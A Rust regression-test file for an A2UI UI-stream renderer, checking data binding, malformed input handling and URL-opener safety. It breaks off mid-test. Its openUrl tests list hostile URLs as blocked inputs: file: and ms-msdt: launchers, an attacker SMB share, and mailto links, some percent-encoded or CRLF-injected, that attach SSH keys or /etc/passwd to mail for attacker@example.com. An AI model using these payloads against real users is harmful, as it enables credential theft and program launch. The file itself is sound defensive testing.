//! Regression tests from the 2026-07-24 adversarial review of the A2UI
//! renderer: binding resolution gaps, protocol tolerance, and silent
//! write failures. Each test names the finding it pins.

use fenestra_a2ui::{A2uiMsg, A2uiSignal, Client, NoteKind, parse_stream};
use fenestra_core::{Element, Theme};

fn apply(stream: &str) -> Client {
    let msgs = parse_stream(stream).expect("stream parses");
    let mut client = Client::new();
    client.apply_all(&msgs).expect("stream applies");
    client
}

fn frame_tree(el: &Element<A2uiMsg>, size: (f32, f32)) -> String {
    let mut fonts = fenestra_core::Fonts::embedded();
    let mut state = fenestra_core::FrameState::new();
    let frame = fenestra_core::build_frame(el, &Theme::light(), &mut fonts, &mut state, size, 1.0);
    frame.debug_tree()
}

/// Finding 1: `Icon.name` is a dynamic value in the catalog — a bound name
/// must resolve against the data model, not stringify the binding object.
/// The official task-card example binds `/priorityIcon` = `"priority_high"`
/// (a Material name, honestly noted as outside the vendored Lucide set) —
/// the note must name the *resolved* value, never `{"path": …}`.
#[test]
fn bound_icon_names_resolve() {
    let stream = std::fs::read_to_string(
        std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures/07_task-card.json"),
    )
    .expect("fixture exists");
    let client = apply(&stream);
    let rendered = client
        .single_surface()
        .expect("surface")
        .render(&Theme::light());
    assert!(
        !rendered
            .notes
            .iter()
            .any(|n| n.detail.contains("{\"path\"")),
        "the binding object leaked into rendering, notes: {:?}",
        rendered.notes
    );
    let tree = frame_tree(&rendered.element, (480.0, 640.0));
    assert!(
        rendered
            .notes
            .iter()
            .any(|n| n.kind == NoteKind::UnknownIcon && n.detail.contains("priority_high"))
            || tree.contains("priority_high"),
        "the bound icon name must resolve to priority_high; notes: {:?}",
        rendered.notes
    );
}

/// Finding 2: a template with an *absolute* path inside a collection scope
/// must resolve item scopes from that absolute path, not from a corrupted
/// `{scope}//abs` join.
#[test]
fn nested_template_absolute_paths_resolve() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateDataModel":{"surfaceId":"s","path":"/","value":{
            "rows": [{"title": "first"}, {"title": "second"}],
            "orders": [{"name": "alpha"}, {"name": "beta"}]
        }}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"Column","children":{"componentId":"row-tpl","path":"/rows"}},
            {"id":"row-tpl","component":"Column","children":{"componentId":"order-tpl","path":"/orders"}},
            {"id":"order-tpl","component":"Text","text":{"path":"name"}}
        ]}}
    ]"#;
    let client = apply(stream);
    let rendered = client
        .single_surface()
        .expect("surface")
        .render(&Theme::light());
    let tree = frame_tree(&rendered.element, (480.0, 640.0));
    assert!(
        tree.contains("alpha") && tree.contains("beta"),
        "absolute template paths under a scope must resolve; notes: {:?}\ntree:\n{tree}",
        rendered.notes
    );
}

/// Finding 3: an action's message must carry the source component id, so
/// hosts can populate the client→server action message's required
/// `sourceComponentId`.
#[test]
fn event_actions_carry_the_source_component() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"Column","children":["go"]},
            {"id":"go","component":"Button","child":"go-label",
             "action":{"event":{"name":"launch"}}},
            {"id":"go-label","component":"Text","text":"Go"}
        ]}}
    ]"#;
    let mut client = apply(stream);
    let rendered = client
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    let msg = find_click(&rendered.element).expect("the button carries a click message");
    let A2uiMsg::Event {
        ref source_id,
        ref name,
        ..
    } = msg
    else {
        panic!("expected an event message, got {msg:?}");
    };
    assert_eq!(name, "launch");
    assert_eq!(source_id, "go", "the firing component's id must ride along");
    let signal = client
        .surface_mut("s")
        .expect("surface")
        .handle(msg.clone())
        .pop()
        .expect("events surface as signals");
    let A2uiSignal::Event { source_id, .. } = signal else {
        panic!("expected an event signal");
    };
    assert_eq!(source_id, "go");
}

fn find_click(el: &Element<A2uiMsg>) -> Option<A2uiMsg> {
    if let Some(msg) = el.click_msg() {
        return Some(msg.clone());
    }
    el.children_ref().iter().find_map(find_click)
}

/// Finding 4: toggling a literal-valued CheckBox stores a local edit; the
/// next render must *read it back* (the toggle message flips).
#[test]
fn literal_checkbox_toggles_take_effect() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"CheckBox","label":"Agree","value":false}
        ]}}
    ]"#;
    let mut client = apply(stream);
    let rendered = client
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    let toggle = find_click(&rendered.element).expect("the checkbox toggles on click");
    let A2uiMsg::LocalEdit { ref value, .. } = toggle else {
        panic!("a literal checkbox stores a local edit, got {toggle:?}");
    };
    assert_eq!(
        value,
        &serde_json::Value::Bool(true),
        "unchecked toggles on"
    );
    assert!(
        client
            .surface_mut("s")
            .expect("surface")
            .handle(toggle)
            .is_empty()
    );
    let rendered = client
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    let toggle = find_click(&rendered.element).expect("still toggleable");
    let A2uiMsg::LocalEdit { value, .. } = toggle else {
        panic!("expected a local edit");
    };
    assert_eq!(
        value,
        serde_json::Value::Bool(false),
        "after toggling on, the checkbox must render checked (next toggle turns it off)"
    );
}

/// Finding 5: an unknown message type (a newer protocol revision) is
/// skipped with a note on the surface it names — the stream around it
/// still applies and renders.
#[test]
fn unknown_message_types_are_skipped_not_fatal() {
    let stream = r##"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateTheme":{"surfaceId":"s","primaryColor":"#ff0000"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"Text","text":"still here"}
        ]}}
    ]"##;
    let client = apply(stream);
    let surface = client.surface("s").expect("the stream still applies");
    let rendered = surface.render(&Theme::light());
    let tree = frame_tree(&rendered.element, (480.0, 640.0));
    assert!(
        tree.contains("still here"),
        "known messages around the unknown one apply"
    );
    assert!(
        surface
            .notes()
            .iter()
            .any(|n| n.kind == NoteKind::UnknownMessage && n.component_id == "updateTheme"),
        "the skipped message type is noted, got: {:?}",
        surface.notes()
    );
}

/// Finding 6: a *known* component whose body is malformed (Slider without
/// `max`) degrades to a placeholder with a note; its siblings and the rest
/// of the stream are untouched.
#[test]
fn malformed_known_component_degrades_not_fails() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"Column","children":["ok","broken"]},
            {"id":"ok","component":"Text","text":"fine"},
            {"id":"broken","component":"Slider","value":3}
        ]}}
    ]"#;
    let client = apply(stream);
    let rendered = client
        .single_surface()
        .expect("the stream applies despite the malformed component")
        .render(&Theme::light());
    let tree = frame_tree(&rendered.element, (480.0, 640.0));
    assert!(tree.contains("fine"), "siblings render");
    assert!(
        rendered
            .notes
            .iter()
            .any(|n| n.kind == NoteKind::MalformedComponent && n.detail.contains("Slider")),
        "a *known* name that failed to parse is malformed, not unknown, got: {:?}",
        rendered.notes
    );
}

/// Finding 8: data-model array writes support RFC 6901 `-` (append), and a
/// write that cannot apply records a note instead of vanishing.
#[test]
fn array_appends_apply_and_bad_writes_are_noted() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateDataModel":{"surfaceId":"s","path":"/items","value":[1]}},
        {"version":"v0.9","updateDataModel":{"surfaceId":"s","path":"/items/-","value":2}},
        {"version":"v0.9","updateDataModel":{"surfaceId":"s","path":"/items/9","value":3}}
    ]"#;
    let client = apply(stream);
    let surface = client.surface("s").expect("surface");
    assert_eq!(
        surface.data().pointer("/items").unwrap(),
        &serde_json::json!([1, 2]),
        "`-` appends"
    );
    assert!(
        surface
            .notes()
            .iter()
            .any(|n| n.kind == NoteKind::RejectedWrite && n.component_id == "/items/9"),
        "the dropped out-of-range write is noted, got: {:?}",
        surface.notes()
    );
}

/// Finding 4 (mature form): every literal-valued input control stays
/// interactive through local edits — a ChoicePicker with a literal value
/// renders the locally edited selection after the user changes it.
#[test]
fn literal_choice_picker_reads_local_edits() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"ChoicePicker","variant":"mutuallyExclusive",
             "options":[{"label":"Pro","value":"pro"},{"label":"Basic","value":"basic"}],
             "value":"pro"}
        ]}}
    ]"#;
    let mut client = apply(stream);
    let signal = client
        .surface_mut("s")
        .expect("surface")
        .handle(A2uiMsg::LocalEdit {
            key: "root".into(),
            value: serde_json::json!(["basic"]),
        });
    assert!(signal.is_empty(), "local edits are internal");
    let rendered = client
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    let tree = frame_tree(&rendered.element, (480.0, 640.0));
    assert!(
        tree.contains("Basic"),
        "the locally edited selection must render; tree:\n{tree}"
    );
}

/// Finding 10: a mutually-exclusive ChoicePicker bound to a *string* value
/// selects the matching option, exactly like the literal-string form.
#[test]
fn bound_string_choice_picker_selects() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateDataModel":{"surfaceId":"s","path":"/plan","value":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"ChoicePicker","variant":"mutuallyExclusive",
             "options":[{"label":"Pro","value":"pro"},{"label":"Basic","value":"basic"}],
             "value":{"path":"/plan"}}
        ]}}
    ]"#;
    let client = apply(stream);
    let rendered = client
        .single_surface()
        .expect("surface")
        .render(&Theme::light());
    let tree = frame_tree(&rendered.element, (480.0, 640.0));
    assert!(
        tree.contains("Basic"),
        "the bound string selection must show; tree:\n{tree}"
    );
}

// ── From the 2026-08-05 review: silent fidelity losses ────────────────────

/// `Slider::range` ignores anything that is not `max > min`, so an empty or
/// non-finite range used to leave the control quietly on its default
/// 0..=1 domain — a slider showing the wrong scale with nothing to say
/// about it.
#[test]
fn empty_slider_ranges_are_reported() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"Slider","min":5,"max":5,"value":5}
        ]}}
    ]"#;
    let rendered = apply(stream)
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    assert!(
        rendered
            .notes
            .iter()
            .any(|n| n.kind == NoteKind::InvalidValue && n.detail.contains("slider range")),
        "an unusable range must be reported, got: {:?}",
        rendered.notes
    );
}

/// A selection that names no existing option renders as *nothing selected*,
/// which is indistinguishable from an empty picker unless it is reported.
#[test]
fn selections_matching_no_option_are_reported() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"ChoicePicker","variant":"mutuallyExclusive",
             "value":["xl"],"options":[
                {"label":"Small","value":"s"},
                {"label":"Large","value":"l"}
             ]}
        ]}}
    ]"#;
    let rendered = apply(stream)
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    assert!(
        rendered
            .notes
            .iter()
            .any(|n| n.kind == NoteKind::InvalidValue && n.detail.contains("matches none")),
        "a selection outside the option set must be reported, got: {:?}",
        rendered.notes
    );
}

/// Remote assets render as placeholders because a deterministic render
/// never touches the network. The crate documented that as noted; it was
/// not. A surface of grey boxes must not report full fidelity.
///
/// All three asset components are checked: Video and AudioPlayer had no
/// test of any kind before this.
#[test]
fn remote_assets_report_their_placeholders() {
    for (component, extra) in [
        ("Image", ""),
        ("Video", ""),
        ("AudioPlayer", r#","description":"a podcast""#),
    ] {
        let stream = format!(
            r#"[
            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[
                {{"id":"root","component":"{component}","url":"https://example.com/a"{extra}}}
            ]}}}}
        ]"#
        );
        let rendered = apply(&stream)
            .surface("s")
            .expect("surface")
            .render(&Theme::light());
        assert!(
            rendered
                .notes
                .iter()
                .any(|n| n.kind == NoteKind::NetworkAsset),
            "a placeholder {component} must be reported, got: {:?}",
            rendered.notes
        );
        assert!(
            !fenestra_a2ui::any_broken(&rendered.notes),
            "…but a placeholder is approximate, not broken: {:?}",
            rendered.notes
        );
    }
}

/// This used to assert the opposite: that `validationRegexp` records
/// "parsed but is not enforced yet". It is enforced now, so the thing worth
/// pinning is that it enforces *and* stays quiet — a note here would mean
/// the crate is still claiming a gap it has closed. See `tests/validation.rs`
/// for the behavior itself.
#[test]
fn an_enforced_validation_rule_is_not_reported_as_a_gap() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"TextField","label":"Email","value":"",
             "validationRegexp":"^.+@.+$"}
        ]}}
    ]"#;
    let rendered = apply(stream)
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    assert!(
        rendered.notes.is_empty(),
        "an enforced rule is not a fidelity gap, got: {:?}",
        rendered.notes
    );
}

// ── From the 2026-08-05 review of PR #19 ──────────────────────────────────

/// An obscured field renders in cleartext, so the pixels handed back by a
/// headless render contain the secret. That is not an inexactness, and
/// `any_broken` — the check the book tells people to put in CI — has to say
/// so.
#[test]
fn an_unmasked_secret_is_broken_not_approximate() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateDataModel":{"surfaceId":"s","value":{"pw":"hunter2"}}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"TextField","label":"Password","variant":"obscured",
             "value":{"path":"/pw"}}
        ]}}
    ]"#;
    let rendered = apply(stream)
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    assert!(
        rendered
            .notes
            .iter()
            .any(|n| n.kind == NoteKind::SecretExposed),
        "got: {:?}",
        rendered.notes
    );
    assert!(
        fenestra_a2ui::any_broken(&rendered.notes),
        "a surface whose pixels leak a secret must not pass any_broken: {:?}",
        rendered.notes
    );
}

/// A dialog nothing can open is broken, not approximate — the trigger's
/// interactive child takes every press.
#[test]
fn an_unopenable_modal_is_broken() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"Modal","trigger":"card","content":"dlg"},
            {"id":"card","component":"Card","child":"btn"},
            {"id":"btn","component":"Button","child":"lbl","action":{"event":{"name":"go"}}},
            {"id":"lbl","component":"Text","text":"Press me"},
            {"id":"dlg","component":"Text","text":"body"}
        ]}}
    ]"#;
    let rendered = apply(stream)
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    assert!(
        rendered
            .notes
            .iter()
            .any(|n| n.kind == NoteKind::Unreachable),
        "got: {:?}",
        rendered.notes
    );
    assert!(
        fenestra_a2ui::any_broken(&rendered.notes),
        "a dialog that cannot be opened must not pass any_broken: {:?}",
        rendered.notes
    );
}

/// A selection binding with nothing written yet is the ordinary empty
/// state, exactly as it is for a text field. Reporting it as broken made
/// every fresh form fail its own CI check.
#[test]
fn an_empty_selection_binding_is_not_a_fidelity_loss() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"ChoicePicker","variant":"mutuallyExclusive",
             "value":{"path":"/choice"},"options":[
                {"label":"Small","value":"s"},{"label":"Large","value":"l"}
             ]}
        ]}}
    ]"#;
    let rendered = apply(stream)
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    assert!(
        rendered.notes.is_empty(),
        "a form that has not been filled in yet is not degraded: {:?}",
        rendered.notes
    );
}

/// Fields that parse and then go nowhere have to say so — a chips picker
/// rendering as a dropdown, an image ignoring its fit, a time-only input
/// asking for a date. Each renders something sensible, so each is
/// approximate rather than broken, but silence would claim the stream got
/// what it asked for.
#[test]
fn parsed_but_unhonored_fields_are_reported() {
    let cases: [(&str, &str); 3] = [
        (
            r#"{"id":"root","component":"Image","url":"https://e.com/a.png","fit":"cover"}"#,
            "fit",
        ),
        (
            r#"{"id":"root","component":"ChoicePicker","variant":"mutuallyExclusive",
                "value":[],"displayStyle":"chips","filterable":true,
                "options":[{"label":"A","value":"a"}]}"#,
            "displayStyle",
        ),
        (
            r#"{"id":"root","component":"DateTimeInput","value":"2026-01-01",
                "enableDate":false,"enableTime":true}"#,
            "enableDate/enableTime",
        ),
    ];
    for (component, field) in cases {
        let stream = format!(
            r#"[
            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[{component}]}}}}
        ]"#
        );
        let rendered = apply(&stream)
            .surface("s")
            .expect("surface")
            .render(&Theme::light());
        assert!(
            rendered
                .notes
                .iter()
                .any(|n| n.kind == NoteKind::Unsupported && n.detail.contains(field)),
            "{field} must be reported, got: {:?}",
            rendered.notes
        );
    }
}

/// A URL the host will hand to the platform opener cannot be an arbitrary
/// string from the stream.
///
/// `A2uiSignal::OpenUrl` exists to be passed to `open(1)` / `xdg-open` —
/// that is what the book's host example does with it — and those launch
/// whatever application has registered the scheme. An A2UI stream is
/// attacker-influenced input whenever the agent producing it has read
/// anything untrusted, so a `file:` or a custom app scheme reaching that
/// call is a way to start programs on the user's machine from JSON. The
/// renderer classifies the scheme instead of leaving every host to
/// remember to.
#[test]
fn open_url_refuses_a_scheme_the_host_should_not_launch() {
    for url in [
        "file:///Applications/Calculator.app",
        "javascript:alert(1)",
        "ms-msdt:/id",
        "smb://attacker.example/share",
        "data:text/html;base64,PHNjcmlwdD4=",
        // Scheme-less: `open(1)` reads a bare path as a local file, so this
        // is `file:` wearing a hat.
        "//attacker.example/share",
        "/etc/passwd",
        // An allowed scheme is not an allowed URL. Mail clients that honour
        // the attachment parameter will stage the named local file into a
        // pre-addressed outgoing message.
        "mailto:attacker@example.com?subject=hi&attach=/Users/u/.ssh/id_rsa",
        "mailto:attacker@example.com?ATTACHMENT=/etc/passwd&body=x",
    ] {
        let stream = format!(
            r#"[
            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[
                {{"id":"root","component":"Button","child":"lbl",
                 "action":{{"functionCall":{{"call":"openUrl","args":{{"url":"{url}"}}}}}}}},
                {{"id":"lbl","component":"Text","text":"Visit"}}
            ]}}}}
        ]"#
        );
        let rendered = apply(&stream)
            .surface("s")
            .expect("surface")
            .render(&Theme::light());
        assert!(
            rendered
                .notes
                .iter()
                .any(|n| n.kind == NoteKind::BlockedUrlScheme),
            "{url} must be reported as a blocked scheme, got: {:?}",
            rendered.notes
        );
        // And there must be no way to reach the opener at all. A blocked
        // action makes the button inert, which the kit builds as a disabled
        // control carrying no click message — so the assertion is that
        // nothing is clickable, not a conditional walk over a message that
        // never exists. (Written the other way first, this whole block was
        // dead code that asserted nothing.)
        let mut client = apply(&stream);
        let surface = client.surface_mut("s").expect("surface");
        let rendered = surface.render(&Theme::light());
        assert!(
            find_click(&rendered.element).is_none(),
            "{url} left a live control that could reach the opener"
        );

        // Belt and braces: even if a future refactor made it clickable,
        // handling every message it could emit must not produce an OpenUrl.
        for msg in [A2uiMsg::Ignored] {
            for signal in surface.handle(msg) {
                assert!(
                    !matches!(signal, A2uiSignal::OpenUrl(_)),
                    "{url} reached the host as an OpenUrl signal"
                );
            }
        }
    }
}

/// A `mailto:` header field is percent-encoded on the wire, and the
/// blocklist compared the *raw* name.
///
/// RFC 6068 spells `hfname` as `*qchar`, and `qchar` includes
/// `pct-encoded`; a conforming client percent-decodes the name before
/// acting on it. So `%61ttach` is `attach` by the time it reaches the mail
/// client, and it sailed past a check comparing it to the literal string
/// `"attach"`. The same hole swallowed every vendor spelling nobody had
/// thought to enumerate.
///
/// The fix is the one `OPENABLE_SCHEMES` already makes for schemes: the set
/// of header fields a mail client will act on is open-ended, so name the
/// few that are safe rather than the ones that are known to be dangerous.
#[test]
fn open_url_refuses_mailto_fields_that_are_not_plainly_safe() {
    for url in [
        // Percent-encoded, and therefore invisible to a literal comparison.
        "mailto:attacker@example.com?%61ttach=/Users/u/.ssh/id_rsa",
        "mailto:attacker@example.com?%41TTACHMENT=/etc/passwd",
        "mailto:attacker@example.com?subject=hi&%61ttachment=/etc/passwd",
        // A vendor spelling the old blocklist never enumerated. There is no
        // finite list of these, which is the whole argument for an allowlist.
        "mailto:attacker@example.com?x-mozilla-attach=/etc/passwd",
        "mailto:attacker@example.com?attachurl=file:///etc/passwd",
        // Allowlisting the *name* is only half of it. RFC 6068 §7 warns
        // that a client writing hfvalues into headers without sanitizing
        // can be made to emit fields the URL never listed, so a decoded CR
        // or LF inside a permitted field smuggles one in behind it — the
        // encoded-value twin of the encoded-name hole above.
        "mailto:victim@example.com?subject=Hi%0D%0Aattach=/Users/u/.ssh/id_rsa",
        "mailto:victim@example.com?cc=a@b%0D%0Abcc=attacker@example.com",
        "mailto:victim@example.com?in-reply-to=%3Cx@y%3E%0D%0Aattach=/etc/passwd",
        // No `?` at all: the address half is percent-encodable too, and
        // checking only the query missed this entirely.
        "mailto:victim@example.com%0D%0Aattach=/Users/u/.ssh/id_rsa",
    ] {
        let stream = format!(
            r#"[
            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[
                {{"id":"root","component":"Button","child":"lbl",
                 "action":{{"functionCall":{{"call":"openUrl","args":{{"url":"{url}"}}}}}}}},
                {{"id":"lbl","component":"Text","text":"Mail"}}
            ]}}}}
        ]"#
        );
        let rendered = apply(&stream)
            .surface("s")
            .expect("surface")
            .render(&Theme::light());
        assert!(
            rendered
                .notes
                .iter()
                .any(|n| n.kind == NoteKind::BlockedUrlScheme),
            "{url} must be refused, got: {:?}",
            rendered.notes
        );
        assert!(
            find_click(&rendered.element).is_none(),
            "{url} left a live control that could reach the opener"
        );
    }
}

/// And the header fields a generated link legitimately uses keep working —
/// an allowlist that blocked ordinary mail links would just get removed.
#[test]
fn open_url_still_composes_ordinary_mail() {
    for url in [
        "mailto:someone@example.com?subject=Hello%20there",
        "mailto:someone@example.com?subject=Report&body=See%20attached%20link",
        "mailto:a@example.com?cc=b@example.com&bcc=c@example.com",
        "mailto:someone@example.com?in-reply-to=%3Cabc@example.com%3E",
        // Empty query, and a bare address with a trailing '?'.
        "mailto:someone@example.com?",
        // Verbatim from RFC 6068 §6.1: `%0D%0A` is how the spec says to
        // write a line break in a *body*, so refusing it — which an
        // earlier cut of the CR/LF rule did, by banning line breaks in
        // every field — rejects a conformant multi-line mail link and
        // blames the scheme. A body cannot inject a header; it is the
        // payload, and everything after the header block belongs to it.
        "mailto:infobot@example.com?body=send%20current-issue%0D%0Asend%20index",
    ] {
        let stream = format!(
            r#"[
            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[
                {{"id":"root","component":"Button","child":"lbl",
                 "action":{{"functionCall":{{"call":"openUrl","args":{{"url":"{url}"}}}}}}}},
                {{"id":"lbl","component":"Text","text":"Mail"}}
            ]}}}}
        ]"#
        );
        let mut client = apply(&stream);
        let surface = client.surface_mut("s").expect("surface");
        let rendered = surface.render(&Theme::light());
        assert!(
            !rendered
                .notes
                .iter()
                .any(|n| n.kind == NoteKind::BlockedUrlScheme),
            "{url} is an ordinary mail link, got: {:?}",
            rendered.notes
        );
        let msg = find_click(&rendered.element).expect("the link is clickable");
        assert!(
            surface
                .handle(msg)
                .iter()
                .any(|s| matches!(s, A2uiSignal::OpenUrl(u) if u == url)),
            "{url} must reach the host"
        );
    }
}

/// `A2uiSignal::OpenUrl` tells its reader the URL is safe to hand to a
/// platform opener. That has to be true of every one the host can receive,
/// not only of the ones this renderer happened to construct.
///
/// `A2uiMsg` is public, so a host can hold one it built itself, replayed
/// from a log, or round-tripped through its own message type, and hand it
/// straight to `handle`. Checking only where the action is resolved makes
/// the guarantee a property of today's call graph rather than of the type.
#[test]
fn a_handed_in_open_url_is_checked_before_it_becomes_a_signal() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"Text","text":"hi"}
        ]}}
    ]"#;
    for url in [
        "file:///etc/passwd",
        "javascript:alert(1)",
        "mailto:a@example.com?attach=/etc/passwd",
        "mailto:a@example.com?%61ttach=/etc/passwd",
    ] {
        let mut client = apply(stream);
        let surface = client.surface_mut("s").expect("surface");
        let signals = surface.handle(A2uiMsg::OpenUrl(url.to_owned()));
        assert!(
            signals.is_empty(),
            "{url} reached the host as {signals:?}, but the signal promises a \
             scheme the host may launch"
        );
        assert!(
            surface
                .notes()
                .iter()
                .any(|n| n.kind == NoteKind::BlockedUrlScheme),
            "refusing {url} silently is the failure this crate exists not to have, \
             got: {:?}",
            surface.notes()
        );
    }
}

/// The public checker is the renderer's whole rule, not the scheme half.
///
/// `OPENABLE_SCHEMES` is public and `is_openable` was not, which left a
/// host re-validating a replayed URL with the only tool it had — scheme
/// membership — and accepting exactly the strings the renderer refuses.
#[test]
fn the_public_url_check_matches_what_the_renderer_does() {
    for url in [
        "https://a2ui.org/spec",
        "http://localhost:8080/preview",
        "mailto:someone@example.com",
        "mailto:someone@example.com?subject=Hi&body=there",
    ] {
        assert!(
            fenestra_a2ui::is_openable_url(url),
            "{url} is an ordinary link the renderer opens"
        );
    }
    for url in [
        "file:///etc/passwd",
        "javascript:alert(1)",
        "/etc/passwd",
        "mailto:a@example.com?attach=/etc/passwd",
        "mailto:a@example.com?%61ttach=/etc/passwd",
        "mailto:a@example.com?subject=Hi%0D%0Aattach=/etc/passwd",
    ] {
        assert!(
            !fenestra_a2ui::is_openable_url(url),
            "{url} must be refused"
        );
    }

    // And the trap the export exists to close, stated as a property rather
    // than a tautology: there is at least one URL a scheme-membership test
    // accepts and `is_openable_url` refuses. Written the other way first —
    // `!scheme_only || url.starts_with("mailto:")` over the loop above — it
    // could not fail for any fixture and would have kept passing had
    // `is_openable_url` been reduced to bare scheme membership.
    let scheme_only = |url: &str| {
        fenestra_a2ui::OPENABLE_SCHEMES
            .iter()
            .any(|s| url.starts_with(&format!("{s}:")))
    };
    let divergent = [
        "mailto:a@example.com?attach=/etc/passwd",
        "mailto:a@example.com?%61ttach=/etc/passwd",
        "mailto:a@example.com?subject=Hi%0D%0Aattach=/etc/passwd",
        "mailto:victim@example.com%0D%0Aattach=/etc/passwd",
    ];
    for url in divergent {
        assert!(
            scheme_only(url),
            "{url} must pass a scheme test, or it proves nothing about the gap"
        );
        assert!(
            !fenestra_a2ui::is_openable_url(url),
            "{url} passes a scheme test and must still be refused — this is the \
             whole reason a host cannot re-derive the rule from OPENABLE_SCHEMES"
        );
    }
}

/// One cause, one diagnosis. A blocked scheme records why the control is
/// dead; the generic "no action it can carry out" note is a vaguer
/// restatement of the same fact and must not accompany it.
#[test]
fn a_blocked_scheme_does_not_also_report_the_control_as_unreachable() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"Button","child":"lbl",
             "action":{"functionCall":{"call":"openUrl","args":{"url":"file:///etc/passwd"}}}},
            {"id":"lbl","component":"Text","text":"Visit"}
        ]}}
    ]"#;
    let rendered = apply(stream)
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    let kinds: Vec<NoteKind> = rendered
        .notes
        .iter()
        .filter(|n| n.component_id == "root")
        .map(|n| n.kind)
        .collect();
    assert!(
        kinds.contains(&NoteKind::BlockedUrlScheme),
        "the block must be reported, got: {kinds:?}"
    );
    assert!(
        !kinds.contains(&NoteKind::Unreachable),
        "and must not be doubled by a vaguer note, got: {kinds:?}"
    );
}

/// The schemes a link is actually for still work, unchanged.
#[test]
fn open_url_still_opens_the_web() {
    for url in [
        "https://a2ui.org/spec",
        "http://localhost:8080/preview",
        "mailto:someone@example.com",
    ] {
        let stream = format!(
            r#"[
            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[
                {{"id":"root","component":"Button","child":"lbl",
                 "action":{{"functionCall":{{"call":"openUrl","args":{{"url":"{url}"}}}}}}}},
                {{"id":"lbl","component":"Text","text":"Visit"}}
            ]}}}}
        ]"#
        );
        let mut client = apply(&stream);
        let surface = client.surface_mut("s").expect("surface");
        let rendered = surface.render(&Theme::light());
        assert!(
            !rendered
                .notes
                .iter()
                .any(|n| n.kind == NoteKind::BlockedUrlScheme),
            "{url} is a normal link, got: {:?}",
            rendered.notes
        );
        let msg = find_click(&rendered.element).expect("the link is clickable");
        let signals = surface.handle(msg);
        assert!(
            signals
                .iter()
                .any(|s| matches!(s, A2uiSignal::OpenUrl(u) if u == url)),
            "{url} must reach the host, got: {signals:?}"
        );
    }
}

/// An `openUrl` with nothing to open must do nothing, rather than handing
/// the host an empty URL it never asked for.
#[test]
fn open_url_with_an_unresolved_argument_does_nothing() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
